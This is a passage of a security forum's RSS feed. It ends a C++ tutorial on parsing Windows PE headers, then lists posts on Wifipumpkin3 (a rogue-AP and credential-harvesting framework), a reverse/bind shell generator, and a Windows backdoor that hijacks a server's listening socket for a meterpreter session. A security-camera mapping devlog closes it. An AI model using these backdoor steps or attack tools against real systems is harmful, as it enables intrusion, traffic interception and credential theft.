    fprintf(stdout, "%02hhX", memory[i]);
  }
  counter++;

  if (linebreaker &gt; 3)
  {
   fprintf(stdout, "\n");
   fprintf(stdout, "%#010x: ", i + 1);
   linebreaker = 0;
  }

 }
 cout &lt;&lt; endl &lt;&lt; endl;
}

int _tmain(int argc, TCHAR *argv[])
{
 //file handles
 HANDLE targetBinary;
 LPDWORD readBytes = 0;
 DWORD fileSize;

 //the pointer that will serve as bookmark
 int readPointer = 0x0;

 //get system info to validate some byte values
 SYSTEM_INFO si;
 GetSystemInfo(&amp;si);

 fprintf(stdout, "The page size for this system is %u bytes.\n", si.dwPageSize);


 //handle to file needs to be called via CreateHandle
 targetBinary = CreateFile(L"C:/Program Files (x86)/Wizards of the Coast/MTGA/MTGA.exe", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 fileSize = GetFileSize(targetBinary, NULL);

 fprintf(stdout, "File is %d Kbytes large\n", fileSize/1024);
 char *fileContent = new char[fileSize];

 
 if (targetBinary != INVALID_HANDLE_VALUE)
 {
  DWORD retVal = 0;
  //if function successfull, retVal is != 0
  if(!(retVal = ReadFile(targetBinary, (LPVOID)fileContent,fileSize, readBytes, NULL)))
  {
   fprintf(stdout, "There was an error reading input file!: %d returned.\n",retVal);
   exit (-1);
  }

  //fprintf(stdout, "Return value of ReadFile(5) is %d\n", retVal);
 }

 //first, get that 0x3c word so we know where to start reading
 readPointer = saveValuePNTR(fileContent, 0x3c, WORD_L);
 fprintf(stdout, "\nINITIALISING....\nReadpointer before operation: %x",readPointer);
 fprintf(stdout, "\n[DWORD]  PE-SIGNATURE           :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\nReadpointer after operation: %x\nInitialising finished", readPointer);

 //first block: PE FILE HEADER
 fprintf(stdout, "\n\nCollect Information (PE file header):");
 fprintf(stdout, "\n[WORD]  Mashinae Type          :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
 unsigned int sectionCount = saveValuePNTR(fileContent, readPointer, WORD_L);            
 fprintf(stdout, "\n[WORD]  Number of Sections     :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
 fprintf(stdout, "\n[DWORD] Timestamp              :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n[DWORD] Pointer to symbol table:0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n[DWORD] Number of Symbols      :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n[WORD]  Size of optional header:0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
 fprintf(stdout, "\n[WORD]  Characteristics        :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));

 //second block: OPTIONAL HEADER
 fprintf(stdout, "\n\nOPTIONAL HEADER [general fields]:");
 unsigned int type = saveValuePNTR(fileContent, readPointer, WORD_L);              
 fprintf(stdout, "\n[WORD] Architecture            :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
 if (type == 0x010b)
  fprintf(stdout, "  -&gt;  [32 bit]");
 else if (type == 0x20b)
  fprintf(stdout, "  -&gt;  [64 bit]");
 else if (type == 0x107)
  fprintf(stdout, "  -&gt;  [ROM img]");
 else
  fprintf(stdout, "  -&gt;  [unknown]");

 fprintf(stdout, "\n[BYTE] Major Linker Version    :0x%08x", getValuePNTR(fileContent, readPointer, BYTE_L));
 fprintf(stdout, "\n[BYTE] Minor Linker Version    :0x%08x", getValuePNTR(fileContent, readPointer, BYTE_L));
 fprintf(stdout, "\n[DWORD]Size of Code            :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n[DWORD]SizeofInitialisedData   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n[DWORD]SizeifUninialisedData   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n[DWORD]Adress of Entrypoint    :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n[DWORD]CodeBase                :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));

 //next field depending on arch (only present in 32bit executables)
 if (type == 0x010b)
  fprintf(stdout, "\n[DWORD]Base of Data            :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));


 fprintf(stdout, "\n\nOPTIONAL HEADER [windows only fields]:");
 fprintf(stdout, "\n[DWORD / QWORD]ImageBase       :");

 unsigned int base;
 //next field depending on arch, 4 byte in 32bit, 8 byte in 64bit
 if (type == 0x010b)
 {
  base = saveValuePNTR(fileContent, readPointer, DWORD_L);
  fprintf(stdout, "0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  //fprintf(stdout, "\nDEBUG:     0x%08x , pointer @ %x     \n", base,readPointer);
 }
 else if (type == 0x020b)
 {
  base = saveValuePNTR(fileContent, readPointer, QWORD_L);
  fprintf(stdout, "0x%016x", getValuePNTR(fileContent, readPointer, QWORD_L));
 }
 else
  base = 0xFFFFFFFF;

 unsigned int offset_segment = saveValuePNTR(fileContent, readPointer, DWORD_L);
 fprintf(stdout, "\n[DWORD]Section Alignement      :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n...beginning of text segment @  0x%08x", (base + offset_segment));

 fprintf(stdout, "\n[DWORD]File Alignement         :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n[WORD] OS VERSION major        :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
 fprintf(stdout, "\n[WORD] OS VERSION minor        :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
 fprintf(stdout, "\n[WORD] image version major     :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
 fprintf(stdout, "\n[WORD] image version minor     :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
 fprintf(stdout, "\n[WORD] subsystem major version :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
 fprintf(stdout, "\n[WORD] subsystem minor version :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
 fprintf(stdout, "\n[DWORD] xxxXXX ZERO VAL XXXxxx :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n[DWORD] Imagesize in bytes     :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n[DWORD] Size of headers        :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n[DWORD] Checksum               :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));

 unsigned int subsystem = saveValuePNTR(fileContent, readPointer, WORD_L);
 fprintf(stdout, "\n[WORD]  Subsystem version      :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));

 unsigned int dll_characteristic = saveValuePNTR(fileContent, readPointer, WORD_L);
 fprintf(stdout, "\n[WORD]  DLL characteristics    :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));

 //the next 4 values depend on architecture
 if (type == 0x010b)
 {
  fprintf(stdout, "\n[DWORD] SizeOfStackReserve     :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\n[DWORD] SizeOfStackCommit      :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\n[DWORD] SizeOfHeapReserve      :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\n[DWORD] SizeOfHeapCommit       :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 }
 else if (type == 0x20b)
 {
  fprintf(stdout, "\n[QWORD] SizeOfStackReserve     :0x%016x", getValuePNTR(fileContent, readPointer, QWORD_L));
  fprintf(stdout, "\n[QWORD] SizeOfStackCommit      :0x%016x", getValuePNTR(fileContent, readPointer, QWORD_L));
  fprintf(stdout, "\n[QWORD] SizeOfHeapReserve      :0x%016x", getValuePNTR(fileContent, readPointer, QWORD_L));
  fprintf(stdout, "\n[QWORD] SizeOfHeapCommit       :0x%016x", getValuePNTR(fileContent, readPointer, QWORD_L));
 }
 fprintf(stdout, "\n[DWORD] LoaderFlag (zeroVal)   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));

 unsigned int remainder = saveValuePNTR(fileContent, readPointer, DWORD_L);
 fprintf(stdout, "\n[DWORD] Remaining header count :0x%08x [Remaining data directories]", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\nPointer now @ %x", readPointer);

 //next up are the data directories, there are usually 16 of them
 //each is 8 byte, so 16 * 8 = 128 &gt;&gt; size of directory entries

 if (remainder == 16)
 {
  fprintf(stdout, "\n\n############################################################\nData Directory entries:");
  fprintf(stdout, "\nExport Table           :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nImport Table           :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nResource Table         :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nException Table        :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nCertification Table    :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nBase Relocation Table  :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nDebug                  :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nArchitecture           :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nGlobal PTR             :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nTLS Table              :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nLoad Config Table      :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nBound Import           :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nIAT                    :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nDelay Import Descriptor:0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nCLR Runtime Header     :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nReserved Zero Value    :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nEnd Data Directories, PNTr now @  %x", readPointer);
 }
 else
 {
  fprintf(stdout, "\n\nDetected non-standart data directories, recalculating Pointer ...");
  readPointer += (remainder) * 8;
  fprintf(stdout, "\nEnd Data Directories, PNTr now @  %x", readPointer);
 }
 
 /*
  Following section headers
  Each section header is 40 byte large (5 DWORDS)
  You can calculate the beginning of the headers, 
  but we came here anyways so let's skip that part
 */
 fprintf(stdout, "\n\n##########   BEGINNING OF SECTION HEADERS   ##########\n");
 for (int i = 0; i &lt; sectionCount; i++)
 {
  //first output the name in plain ascii, big-endian
  fprintf(stdout, "\n\n###################    ");
  output_data_ascii(fileContent, readPointer, readPointer + 8);
  fprintf(stdout, "    ###################");

  readPointer += 8;
  fprintf(stdout, "\nVirtual Size           :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nVirtual Address        :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nSize of Raw Data       :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nPointer to Raw Data    :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nPointer to Relocations :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nPointer to line numbers:0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nNumber of Relocations  :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
  fprintf(stdout, "\nNumber of line numbers :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
  fprintf(stdout, "\nCharacteristix         :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 }

 //close handle, end of operations
 CloseHandle(targetBinary);
    std::cout &lt;&lt; "\nEnd reached!\n";

 return 0;
}
</code></pre>
<p>Copy</p>
<p>Good thing is that I had the chance to fix last-minute bugs while writing this blogpost. Yay!</p>
<h4>Conclusion</h4>
<p><a href="https://1.bp.blogspot.com/-hGeMa1IQYpE/XjAv6rBjb7I/AAAAAAAABNk/U4HLL4QKG04SURo14aL7SbfhjJKG4Dl4gCNcBGAsYHQ/s1600/Capture.PNG" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a24620a028f2bb8c14616c3316afc7e2e46d225a.png" alt="" data-base62-sha1="n9xB33fk1XB9dIHDqMv466w7t9M" width="320" height="312"></a>I hope I could show you that it is really not  <em>that</em>  hard to read out a binary if you have a fundamental understanding of how operating systems work. Of course there are some major differences between Windows, Linux, Arm (like Raspbian, which basically is a Linux, but on a different processor) and other platforms, but in general they tend to be very similar to each other. For example, there is always a header, a separate code section and sections that are write-protected. And of course Microsoft needed to do their own thing, and although I prefer ELF files myself, there is not that much difference to PE files all in all. Here is a final picture of the program in action:</p>
<p><strong>Where to go from here?</strong><br>
Well, I hope to write a code-injection tutorial in the future, so you can consider this the basics of this topic. We took a deep dive into the structure of PE files here, but we haven’t even looked at actual processor instructions inside the code sections. Don’t worry, tho, we’ll get there eventually. For now, try to open different files with this code, and try to dump code sections with the help of the currently unused  <strong>output_bytes</strong>  function. In fact, try to expand this program to actually manipulate values in the target binary. If you manage to do this, you are a big step further at becoming a professional hacker. If you have questions, feel free to ask them to me, but don’t expect me to know everything ^^</p>
<p>Some good sources to this topic, although for Linux, are Dennis Adriesses’ <a href="https://www.amazon.de/Practical-Binary-Analysis-Instrumentation-Disassembly/dp/1593279124/ref=sr_1_1?__mk_de_DE=%C3%85M%C3%85%C5%BD%C3%95%C3%91&amp;crid=19E3OACZKAKPL&amp;keywords=practical+binary+analysis&amp;qid=1580214941&amp;sprefix=practical+binary+%2Caps%2C161&amp;sr=8-1" rel="noopener nofollow ugc">Practical Binary Analysis</a> and Ryan O’Neil’s <a href="https://www.amazon.de/Learning-Linux-Binary-Analysis-English/dp/1782167102/ref=sr_1_3?__mk_de_DE=%C3%85M%C3%85%C5%BD%C3%95%C3%91&amp;keywords=learning+linux+binary+analysis&amp;qid=1580214990&amp;sr=8-3" rel="noopener nofollow ugc">Learning Linux Binary Analysis</a>.</p>
<p>In fact, I came up with this whole code myself after reading Mr. Adriesses book, which is a major pro for this book, since it imparts knowledge that helps to come up with own solutions rather than just copypasting from the book. I really like this topic and will definately focus my research more on this, but one step after another, chummer…</p>
<p>That’s it, I hope you liked this article! Thank you for reading it to the end.</p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/pe-file-reader-article-dump/21458">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/pe-file-reader-article-dump/21458</link>
          <pubDate>Tue, 26 May 2020 19:03:54 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-21458</guid>
          <source url="https://d.clarkee.co.uk/t/pe-file-reader-article-dump/21458.rss">PE-File Reader [article - dump]</source>
        </item>
        <item>
          <title>Wifipumpkin3 tool</title>
          <dc:creator><![CDATA[mh4x0f]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <h1>Wifipumpkin3</h1>
<p>Description:  Powerful framework for Rogue Wi-Fi Access Point Attack</p>
<pre><code class="lang-auto">→ sudo wifipumpkin3 -i wlp1s0

  _      ___ _____     ___                  __    _      ____
 | | /| / (_) __(_)___/ _ \__ ____ _  ___  / /__ (_)__  |_  /
 | |/ |/ / / _// /___/ ___/ // /  ' \/ _ \/  '_// / _ \_/_ &lt; 
 |__/|__/_/_/ /_/   /_/   \_,_/_/_/_/ .__/_/\_\/_/_//_/____/ 
                                   /_/                       
                                            codename: nidavellir
Made by: @mh4x0f - P0cL4bs Team | 1.0.0 dev
[*] Session id: 81a4f0cc-7ba5-11ea-84fd-94e979fa917b 
Starting prompt...
wp3 &gt; 
</code></pre>
<h2>Overview</h2>
<p><strong>wifipumpkin3</strong> is powerful framework for rogue access point attack, written in Python, that allow and offer to security researchers, red teamers and reverse engineers  to mount a wireless network to conduct a man-in-the-middle attack.</p>
<h2>Main Features</h2>
<ul>
<li>Rogue access point attack</li>
<li>Man-in-the-middle attack</li>
<li>Rouge <strong>Dns Server</strong>
</li>
<li>Captive portal attack (captiveflask)</li>
<li>
<strong>Intercept</strong>, inspect, modify and replay <strong>web traffic</strong>
</li>
<li>
<strong>WiFi</strong> networks scanning</li>
<li>
<strong>DNS</strong> monitoring service</li>
<li>Credentials harvesting</li>
<li>Transparent Proxies</li>
<li>LLMNR, NBT-NS and MDNS poisoner (<a href="https://github.com/skelsec/Responder3" rel="noopener nofollow ugc">Responder3</a>)</li>
<li>and <strong>more</strong>!</li>
</ul>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/P0cL4bs/wifipumpkin3" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="/uploads/default/original/2X/0/0e504e9dc50ca84878ee41498346d9ba57011abb.png" class="thumbnail onebox-avatar" width="400" height="400">

<h3><a href="https://github.com/P0cL4bs/wifipumpkin3" target="_blank" rel="noopener nofollow ugc">P0cL4bs/wifipumpkin3</a></h3>

<p>Powerful framework for rogue access point attack. Contribute to P0cL4bs/wifipumpkin3 development by creating an account on GitHub.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

            <p><small>7 posts - 5 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/wifipumpkin3-tool/20623">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/wifipumpkin3-tool/20623</link>
          <pubDate>Sun, 19 Apr 2020 01:05:02 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-20623</guid>
          <source url="https://d.clarkee.co.uk/t/wifipumpkin3-tool/20623.rss">Wifipumpkin3 tool</source>
        </item>
        <item>
          <title>GoSH, a Golang reverse/bind shell generator</title>
          <dc:creator><![CDATA[TSS]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>Hello 0x00sec !</p>
<p>Having to spend plenty of time in home due to the coronavirus outbreak, I decided to write a simple (and hopefully useful <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> ) tool that automates generation of shells in Golang. More detailed info is available in the README, but I think that the usage is self explanatory.</p>
<p>DISCLAIMER: I have started learning Go just a few days ago, so the code probably will look shitty to the more experienced wielders of this beautiful language. I would love to see your contributions and ideas for improvements :&gt;</p>
<p>Here is the link to the repository:<br>
<a href="https://github.com/TheSecondSun/GoSH" rel="nofollow noopener">https://github.com/TheSecondSun/GoSH</a></p>
<p>Best wishes to everyone</p>
            <p><small>7 posts - 4 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/gosh-a-golang-reverse-bind-shell-generator/20053">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/gosh-a-golang-reverse-bind-shell-generator/20053</link>
          <pubDate>Wed, 25 Mar 2020 18:45:17 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-20053</guid>
          <source url="https://d.clarkee.co.uk/t/gosh-a-golang-reverse-bind-shell-generator/20053.rss">GoSH, a Golang reverse/bind shell generator</source>
        </item>
        <item>
          <title>Sending c# Functions over the internet?</title>
          <dc:creator><![CDATA[dedady157]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>Well let’s start this off with a good old question that a lot of beginner programmers especially those who work around creating servers ask. “can I just send specific functions over sockets?”. and usually its either a “No” or “if you create a specific assembly for them”.</p>
<p>well, sometimes people are really stupid (like me) and don’t want to do that. we want all our code in one file and for it all to just ‘work’ well… that doesn’t work right?</p>
<p>well, it does, theoretically at least. and the use cases for this would be rather nice for example in games sending mods to clients, mod creators don’t want to have 3 separate assemblies, just for their mods.</p>
<p>so how do we do it?<br>
well simple, but actually not…<br>
and I 'v came across the idea as I was in the shower after working with <a href="https://docs.microsoft.com/en-us/dotnet/api/system.reflection.metadata?view=netcore-3.0" rel="nofollow noopener">System.Reflection.Metadata</a> witch-like the rest of the reflection library lets you look at assemblies guts. but a more low level, with the usual method of reflection you can’t really extract a lot out of them, you can of course but its much slower and much harder, and then you get stuck with a dynamic assembly that might not properly work over the internet.<br>
with a more low-level approach, we can fully dissect the assembly, in a semi-fast manner.</p>
<p>Using <a href="https://docs.microsoft.com/en-us/dotnet/api/system.reflection.metadata.metadatareader?view=netcore-3.0" rel="nofollow noopener">MetadataReader</a> alongside <a href="https://docs.microsoft.com/en-us/dotnet/api/system.reflection.portableexecutable.pereader?view=netcore-3.0" rel="nofollow noopener">System.Reflection.PortableExecutable.PEReader</a> we can get all the nice juicy stuff about a given Assembly. with this, we can do a bit of high to low transitioning by Getting our <a href="https://docs.microsoft.com/en-us/dotnet/api/system.reflection.methodinfo?view=netcore-3.0" rel="nofollow noopener">MethodInfo</a> and then the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.reflection.memberinfo.metadatatoken?view=netcore-3.0#System_Reflection_MemberInfo_MetadataToken" rel="nofollow noopener">MethodInfo.MetadataToken</a> we can get the raw metadata definition of that function. alongside a bit of IL Reflection (which is the hardest part) we can extract all the referenced Functions and Types thus allowing us to build a nice large list of all the things we need to pack in order to send a compressed version of this function or better yet functions and types through our socket.</p>
<p>But we need to first build this assembly we plan on sending. with the help of <a href="https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/emitting-dynamic-methods-and-assemblies" rel="nofollow noopener">Dynamic Assembly Generation</a> we can push all the metadata types into one assembly, first building the types than the members, and then finally the functions.</p>
<p><a href="https://pastebin.com/tLpQuXjd" rel="nofollow noopener">A Basic IL Types, Fields and Method reference Extractor</a>.<br>
of course, you would need to do quite a bit of work to get something like this to work.<br>
but it would be an interesting way of Sandboxing mods from game servers.</p>
<p>Well, I might start a project to create something like this soon. any thoughts?</p>
            <p><small>7 posts - 6 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/sending-c-functions-over-the-internet/17512">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/sending-c-functions-over-the-internet/17512</link>
          <pubDate>Fri, 15 Nov 2019 23:09:36 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-17512</guid>
          <source url="https://d.clarkee.co.uk/t/sending-c-functions-over-the-internet/17512.rss">Sending c# Functions over the internet?</source>
        </item>
        <item>
          <title>Virtual-reality project - grand-theft-socket payload</title>
          <dc:creator><![CDATA[rokups]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>I have a windows backdoor pet project - <a href="https://github.com/rokups/virtual-reality/" rel="nofollow noopener">virtual-reality</a>.<br>
I recently added a new payload - grand-theft-socket.</p>
<p>Situation: you have a server you need to backdoor. Server runs a public service listening on some port. For the sake of argument lets pretend it is a webserver. All outgoing traffic is disallowed.</p>
<p>Grand-theft-socket:</p>
<ol>
<li>You inject <code>gts.dll</code> (payload) into webserver process (injection is not covered by VR project)
<ul>
<li>Injected DLL hooks <code>WSAAccept()</code>
</li>
</ul>
</li>
<li>You send a knock by executing <code>vr.py tcp_knock webserver_ip port</code>.</li>
<li>You execute <code>meterpreter/bind_tcp</code> with <code>RHOST=webserver_ip</code> and <code>LPORT=port</code>.</li>
<li>You enjoy your meterpreter session.</li>
</ol>
<p>All of this happens while not interrupting normal service operations. Webserver continues to serve webpages and what not.</p>
<p>How it is done:</p>
<ul>
<li>
<code>tcp_knock</code> sends a small packet requesting next connection to be treated as backdoor connection. This connection is terminated and <code>INVALID_SOCKET</code> is returned to the host process. (knock is not designed to be secure. It is designed to be improbable by chance)</li>
<li>When a connection from ip address that sent a knock is created:
<ol>
<li>New “stager” process is created <a href="https://github.com/rokups/virtual-reality/blob/master/src/gts/gts.cpp#L113-L179" rel="nofollow noopener">[1]</a>
</li>
<li>Accepted socket is duplicated into stager process.</li>
<li>
<code>INVALID_SOCKET</code> is returned to host process.</li>
<li>Stager reads 4 bytes payload length. <a href="https://github.com/rokups/virtual-reality/blob/master/src/stager/stager.c" rel="nofollow noopener">[2]</a>
</li>
<li>Stager reads payload of previously specified length.</li>
<li>Stager executes payload.</li>
</ol>
</li>
</ul>
<p>In a sense we steal a socket from legit service and use it for incoming backdoor connection.</p>
<hr>
<p>You may find some other interesting things in this project.</p>
<ul>
<li>icmp backdoor which executes meterpreter stager sent as ping packet data</li>
<li>https backdoor which harvests steganographically encoded commands from images posted on <a href="http://imgur.com" rel="nofollow noopener">imgur.com</a>
</li>
</ul>
            <p><small>6 posts - 5 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/virtual-reality-project-grand-theft-socket-payload/16197">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/virtual-reality-project-grand-theft-socket-payload/16197</link>
          <pubDate>Thu, 12 Sep 2019 14:42:28 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-16197</guid>
          <source url="https://d.clarkee.co.uk/t/virtual-reality-project-grand-theft-socket-payload/16197.rss">Virtual-reality project - grand-theft-socket payload</source>
        </item>
        <item>
          <title>Watcher - mapping addressable security cameras - a devlog</title>
          <dc:creator><![CDATA[hostile.node]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>Hello all.</p>
<p>I thought I’d tell you a little about a side-project I’ve been working on, now that it is starting to take shape. It is still far from complete but I thought I’d share its development with 0x00sec.</p>
<p>We all know that the mythical Internet Of Things has been on the rise and that people make all kinds of interesting things publically addressable. Security cameras are one of them and for several years I have been wanting to write something that does the heavy lifting of finding them, places them on a map and if possible, streams them.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6e4857a950e1f7b9d4f31109037409b930b82355.png" alt="36" data-base62-sha1="fJBvUrRFPjVPdbrSoGaAlqedYAR" width="690" height="389"></p>
<h1>The technology stack</h1>
<p>There were a couple of things I wanted when I started building this:</p>
<ul>
<li>The program should be able to run locally, rather than as a webservice.</li>
<li>It should run on both Windows and Linux.</li>
<li>Should be extensible, as we aren’t looking at a static environment.</li>
</ul>
<p>For portability, Watcher is written in C++11. As there is a limit to how much of the wheel I’m willing to re-invent, <a href="https://www.libsdl.org/" rel="noopener nofollow ugc">SDL (Simple DirectMedia Layer)</a> provides cross-platform window creation, OpenGL initialisation, input handling and a few other things. Layering on top of SDL and OpenGL, <a href="https://github.com/ocornut/imgui" rel="noopener nofollow ugc">ImGui</a> is used to create the user interface while keeping the bloat low. For data management, <a href="https://sqlite.org/index.html" rel="noopener nofollow ugc">SQLite</a> handles storing and retrieving data from a database local to the program, which requires no “real” database service to have to be installed. The much beloved <a href="https://curl.haxx.se/" rel="noopener nofollow ugc">cURL</a> is used to interact with HTTP servers and finally, a JSON library serialises configuration files (such as rule sets) and messages between individual plugins.</p>
